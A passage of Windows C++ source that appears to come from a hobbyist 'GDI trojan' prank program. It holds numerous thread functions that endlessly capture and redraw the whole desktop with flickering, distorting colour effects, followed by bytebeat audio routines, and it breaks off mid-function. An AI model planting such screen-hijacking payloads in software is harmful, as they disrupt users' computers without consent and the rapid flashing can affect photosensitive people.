	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 100;
		wPt[0].y = wRect.top + 100;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.top + 0;
		wPt[2].x = wRect.left - 0;
		wPt[2].y = wRect.bottom - 0;
		PlgBlt(hdcCopy, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}
DWORD WINAPI eyeeeeeeeeeeeeeeeeeeeeeee(LPVOID lpParam) {
	for (int t = 0;; t++) {
		HDC hdcScreen = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

		HDC hcdc = CreateCompatibleDC(hdcScreen);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

		POINT p = { 0 };
		p.x = (w / 2);
		p.y = (h / 2);

		BLENDFUNCTION blf = { 0 };
		blf.BlendOp = AC_SRC_OVER;
		blf.BlendFlags = 0;
		blf.SourceConstantAlpha = 128;
		blf.AlphaFormat = 0;

		Rr(hdcScreen, 10, p);
		AlphaBlend(hdcScreen, 0, t, w, h, hcdc, 0, 0, w, h, blf);

		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(60);
	}
}
DWORD WINAPI trianglez(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].b += x & y;
			rgbScreen[i].rgb ^= 360;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI blueeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = rand();
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader1(LPVOID lpvd)//credits to pankoza
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				rgbquad[index].rgbRed = x;
				rgbquad[index].rgbGreen = y;
				rgbquad[index].rgbBlue += x;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCERASE);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpParam) {
	srand(time(NULL));
	int xxx = 0;
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y + x * h;
				double wave = cos((x + xxx) * 0.02) + sin((y + xxx) * 0.02);
				pBits[index].rgbRed = (512 * sin(wave) * 0.75);
				pBits[index].rgbGreen = (512 * cos(wave) * 1.25);
				pBits[index].rgbBlue = (512 * tan(wave) * 1.75);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		xxx += 20;
		Sleep(1);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	srand(time(NULL));
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, SRCAND);
		BitBlt(hcdc, 0, 1, w, h, hcdc, 0, 0, SRCPAINT);
		BitBlt(hcdc, 1, 0, w, h, hcdc, 0, 0, SRCPAINT);
		BitBlt(hcdc, 0, -1, w, h, hcdc, 0, 0, SRCAND);
		for (int i = 0; i < w * h; i++) {
			rgbScreen[i].rgb -= ((i & w) + h) & ((i * 4) + (i / h));
		}
		for (int y = 0; y < h; y += 40) {
			StretchBlt(hcdc, -1 + rand() % 5, y, w, 40, hcdc, 0, y, w, 40, SRCPAINT);
		}
		for (int x = 0; x < w; x += 40) {
			StretchBlt(hcdc, x, -1 + rand() % 5, 40, h, hcdc, x, 0, 40, h, SRCPAINT);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1);
	}
}
// NO SKID
DWORD WINAPI shader4(LPVOID lpvd) { //credits to Executioner0x00
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	DOUBLE angle = 0.f;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				//CenterX and CenterY
				int cx = abs(x - (screenWidth / 2));
				int cy = abs(y - (screenHeight / 2));

				//2D Rotating Matrix
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				//XOR Pattern
				int fx = (zx + i) ^ (zy + i);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++; angle += 0.01f;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
// NO SKID
DWORD WINAPI shader5(LPVOID lpParam) { //credits to Executioner0x00
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	DOUBLE angle = 0.f;
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			//CenterX and CenterY
			int cx = abs(x - (w / 2));
			int cy = abs(y - (h / 2));

			//2D Rotating Matrix
			int zx = cos(angle) * cx - sin(angle) * cy;
			int zy = sin(angle) * cx + cos(angle) * cy;

			//XOR Pattern
			int fx = (zx + i) ^ (zy + i);

			rgbScreen[i].rgb += fx;
		}
		angle += 0.01f;
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader6(LPVOID lpvd)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (w / 500) * tan((double)w * (x * PI / 180) / 666) * tan((double)w * (y * PI / 180) / 666) * 24;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);
	int t = 0;
	while (true) 
	{
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) {
			for (int x = 0; x < w; x++) {
				int pos = x + y * w;
				int tmp = (x ^ y) * t;
				prgbScreen[pos].r = GetRValue(tmp);
				prgbScreen[pos].g = GetGValue(tmp);
				prgbScreen[pos].b = GetBValue(tmp);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);

		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
		t++;
	}
	ReleaseDC(NULL, hcdc);
	DeleteDC(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI shader8(LPVOID lpParam) { //credits to pankoza
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0, rad = 17.4f; double ang = 0;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6) {
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 6;
			rgb += (int)data + (x & y);
			((BYTE*)(data + i))[v] = rgb;
		}
		float x = cos(ang) * rad, y = sin(ang) * rad;
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		//Sleep(39.7);
		ang = fmod(ang + PI / rad, PI * rad);
	}
}
DWORD WINAPI shader9(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);
	for (;;) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int temp = prgbScreen[i].rgb;
			prgbScreen[i].rgb = prgbScreen[i / 3].rgb;
			prgbScreen[i / 3].rgb = temp;
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}
	DeleteObject(hBitmap);
	DeleteDC(hcdc);

	return 0;
}
DWORD WINAPI shader10(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);
	for (int t = 0; ; t += 10) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int tmp = x | y ^ t;
				prgbScreen[x + w * y].r = GetRValue(tmp);
				prgbScreen[x + w * y].g = GetGValue(tmp);
				prgbScreen[x + w * y].b = GetBValue(tmp);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(15);
	}
	ReleaseDC(NULL, hcdc);
	DeleteDC(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI shader11(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen = { 0 };
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	//	prgbScreen = {0};

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int t = 0;; t++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int r = GetRValue(prgbScreen[i].rgb);
			int g = GetGValue(prgbScreen[i].rgb);
			int b = GetBValue(prgbScreen[i].rgb);
			prgbScreen[i].rgb = RGB((r + 100) % 256, ((r + g + b) / 4 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(255, 255, 255)) + t * 10;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}
}
DWORD WINAPI shader12(LPVOID lpParam) { // "ai wasn't used in this trust me guys!!!!!"
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			int cx = x - (w / 2);
			int cy = y - (h / 2);

			int zx = (cx * cx);
			int zy = (cy * cy);

			int di = 128.0 + i;

			// Adjust the fx calculation to emphasize yellow
			int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

			// Set color to yellow by emphasizing red and green, minimizing blue
			rgbScreen[i].r = min(255, GetRValue(fx + i) + 200);  // High red component
			rgbScreen[i].g = min(255, GetGValue(fx + i) + 200);  // High green component
			rgbScreen[i].b = min(50, GetBValue(fx + i));         // Low blue component

			// Optional: You can control the intensity or mix yellow based on conditions
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader13(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rndcopy() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rndcopy() % 110)
				v = rndcopy() % 25;
			((BYTE*)(data + i))[v * v] = ((BYTE*)(data + i + v))[v];
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
//---------------------------------------------------sounds-------------------------
VOID WINAPI sound1() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * ((t >> 12 | t >> 8) & 63 & t >> 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound2() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t & t >> 6 & t * (t >> ((t & 65535) >> 12))) + (3 * t / 4 & t >> 12 & 127) + (t * ((t - 2048) >> 7 & (t - 2048) >> 8 & (t - 2048) >> 9 & 16) >> t / 64));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
